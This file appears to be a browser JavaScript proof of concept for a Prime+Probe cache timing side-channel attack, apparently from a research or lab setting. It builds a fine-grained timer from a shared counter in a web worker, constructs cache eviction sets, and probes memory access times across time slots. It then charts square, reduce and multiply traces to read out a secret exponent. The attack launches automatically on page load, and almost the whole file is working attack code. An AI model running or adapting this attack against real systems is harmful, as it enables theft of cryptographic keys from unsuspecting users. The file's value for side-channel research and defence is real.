const CACHE_LINE_SIZE = 64
const CACHE_ASSOCIATIVITY = 12
const sab = new Uint32Array(new SharedArrayBuffer(8))

async function getTargetArrayBuffer() {
  const response = await fetch("/target_file")
  return new Uint8Array(response.arrayBuffer())
}

async function getConfig() {
  const response = await fetch("/config")
  const configString = await response.text()
  const config = {
    threshold: 0,
    wait_cycles: 0,
    time_slots: 0 ,
    time_slot_size: 0, 
    target_file: "",
    probe: []
  }
  const lines = configString.split('\n');
  for(let i = 0; i < lines.length; i++) {
    const line = lines[i];
    if(line.length == 0) continue
    const [key, value] = line.split(' ')
    if(key == "probe") {
      config.probe.push(Number(value))
    } else if(key == "target_file") {
      config.target_file = value
    } else {
      config[key] = Number(value)
    }
  }
  return config
}

function initializeTimer(cb) {

  if(window.Worker) {
    sab[0] = 0
    console.log("initializing worker")
    const worker = new Worker("counter.js");

    worker.onmessage = (event) => {
      console.log(event.data)
      cb()
    }
    worker.postMessage(sab)
  } else {
    console.log("web worker not available")
  }
}

function getTime() {
  return sab[0]
}

class ListNode {
  next = null;
  prev = null;
  index;
  offset;

  constructor(offset, index) {
    this.offset = offset
    this.index = index
  }
  getIndex() {
    return this.index;
  }
  getOffset() {
    return this.offset;
  }
}

class List {
  start = null;
  end = null
  size = 0;

  copy() {
    const newList = new List();
    for(let node = this.start; node; node = node.next) {
      newList.addOffset(node.offset);
    }
    return newList;
  }
  addOffset(offset) {
    const newNode = new ListNode(offset, this.size);
    if(!this.start) {
      this.start = newNode;
      this.end = newNode;
    } else {
      this.end.next = newNode;
      newNode.prev = this.end;
      this.end = newNode;
    }
    this.size++;
  }
  getRandomNode() {
    return this.getNode(this.getRandomIndex())
  }
  getNode(index) {
    let node = this.start;
    for(let i = 0; node && i < index; i++) {
      node = node.next;
    }
    return node;
  }
  getRandomIndex() {
    return Math.round(Math.random() * (this.size - 1))
  }
  filter(func) {
    const newList = new List();
    for(let node = this.start; node; node = node.next) {
      if(func(node)) {
        newList.addOffset(node.offset);
      }
    }
    return newList;
  }
  evict(target) {
    for(let node = this.start; node; node = node.next) {
      let a = target[node.offset]
      let b = a
      a = b
    }
  }

  static union(list1, list2) {
    let result = new List();
    for(let list1node = list1.start; list1node; list1node = list1node.next) {
      result.addOffset(list1node.offset)
    }
    for(let list2node = list2.start; list2node; list2node = list2node.next) {
      result.addOffset(list2node.offset)
    }
    return result
  }
}

function isValidEvictionSet(evictionSet, target, offset, threshold) {
  evictionSet.evict(target)
  const start = getTime()
  let a = target[offset]
  let b = a
  a = b
  const t = getTime() - start;
  return threshold < t
}

function generateCandidateSet() {
  const candidateBuffer = new ArrayBuffer(1000000);
  let list = new List();
  for(let i = 0; i < candidateBuffer.byteLength; i+=CACHE_LINE_SIZE) {
    list.addOffset(i)
  }
  return list
}

function generateEvictionSet(target, offset, candidateSet, threshold) {
  // naive eviction set generation
  const ev = new List();

  while(!ev || ev.size < CACHE_ASSOCIATIVITY) {
 
    const randomOffset = candidateSet.getRandomNode().offset
    const withoutCandidate = candidateSet.filter((l) => l.offset != randomOffset)
    if(isValidEvictionSet(List.union(ev, withoutCandidate), target, offset, threshold)) {
      ev.addOffset(randomOffset)
    }
    candidateSet = withoutCandidate
  }
  return ev
}

function generateConflictSet(evictionSets) {
  let union = evictionSets[0].copy()
  for(let i = 1; i < evictionSets.length; i++) {
    union = List.union(union, evictionSets[i])
  }
  return union
}

function probe(target, offset) {
  const start = getTime()
  let a = target[offset]
  let b = a
  a = b
  const t = getTime() - start;
  return t
}

function wait(n_cycles) {
  for(let i = 0; i < n_cycles; i++) {}
}

function attack() {
  // CLOCK
  initializeTimer(_attack)
}

async function _attack() {

  // TARGET
  const target = await getTargetArrayBuffer();
  const config = await getConfig();
  console.log("config:", config);

  // GENERATE EVICTION SETS
  console.log("generating candidate set")
  const candidateSet = generateCandidateSet()
  console.log("candidate set:", candidateSet)

  console.log("generating eviction sets")
  const evictionSets = new Array(config.probe.length)
  for(let i = 0; i < config.probe.length; i++) {
    evictionSets[i] = generateEvictionSet(target, config.probe[i], candidateSet, config.threshold);
  }
  console.log(evictionSets)
  console.log("generating conflict set")
  const conflictSet = generateConflictSet(evictionSets)
  console.log("initiating attack")
  // fetch("/encrypt", {method: "POST"})
  const results = new Array(config.time_slots)
  for(let i = 0; i < config.time_slots; i++) {
    results[i] = new Array(config.probe.length).fill(0)
  }

  for(let time_slot = 0; time_slot < config.time_slots; time_slot++) {
    const start = getTime();
    for(let addr = 0; addr < config.probe.length; addr++) {
      const addr_idx = config.probe.length - addr - 1;
      const t = probe(target, config.probe[addr_idx])
      results[time_slot][addr_idx] = t;
    }
    conflictSet.evict(target)
    while(getTime() - start < config.time_slot_size) {
      wait(config.wait_cycles);
    }
  }
  console.log("attack is done")

  console.log(results)
  new Chart(document.getElementById("results"), {
    type: 'scatter',
    data: {
      labels: ["Square", "Reduce", "Multiply"],
      datasets: [
        {
          label: "Square",
          data: results.map((d, idx) => ({x: idx, y: d[0]}))
        },
        {
          label: "Reduce",
          data: results.map((d, idx) => ({x: idx, y: d[1]}))
        },
        {
          label: "Multiply",
          data: results.map((d, idx) => ({x: idx, y: d[2]}))
        }
      ]
    },
    options: {
      scales: {
        y: {
          max: 500
        },
        x: {
          type: 'linear',
          position: 'bottom'
        }
      }
    }
  })
}

window.onload = () => {
  document.getElementById("btn-start-attack").onclick = attack;
  attack();
}
